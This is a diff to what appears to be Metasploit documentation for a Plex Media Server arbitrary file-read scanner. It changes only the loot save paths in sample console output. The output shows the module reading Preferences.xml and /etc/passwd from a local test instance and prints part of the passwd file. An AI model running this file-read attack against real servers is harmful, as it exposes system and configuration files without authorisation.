@@ -135,7 +135,7 @@ rport => 32403
 msf auxiliary(scanner/http/plex_media_server_file_read) > run
 [*] Version: 1.43.3.10828-00f62d37d
 [*] Using ratingKey 1
-[+] /config/Library/Application Support/Plex Media Server/Preferences.xml (435 bytes) saved to /home/h00die/.msf4/loot/20260904070345_default_127.0.0.1_plex.file_059264.xml
+[+] /config/Library/Application Support/Plex Media Server/Preferences.xml (435 bytes) saved to /root/.msf4/loot/20260904070345_default_127.0.0.1_plex.file_059264.xml
 <?xml version="1.0" encoding="utf-8"?>
 <Preferences MachineIdentifier="d1a22676-1767-48fd-9c14-63b6325c42a2" ProcessedMachineIdentifier="86e0e62f4708175c68f220c79e67d8bffc128799" customConnections="http://127.0.0.1:32403/" TranscoderTempDirectory="/transcode" IPNetworkType="dualstack" OldestPreviousVersion="legacy" AnonymousMachineIdentifier="4edff671-50d1-47d9-9870-4bca01402794" MetricsEpoch="1" GlobalMusicVideoPathMigrated="1"/>
 
@@ -147,7 +147,7 @@ file => /etc/passwd
 msf auxiliary(scanner/http/plex_media_server_file_read) > run
 [*] Version: 1.43.3.10828-00f62d37d
 [*] Using ratingKey 1
-[+] /etc/passwd (922 bytes) saved to /home/h00die/.msf4/loot/20260904070414_default_127.0.0.1_plex.file_414990.bin
+[+] /etc/passwd (922 bytes) saved to /root/.msf4/loot/20260904070414_default_127.0.0.1_plex.file_414990.bin
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
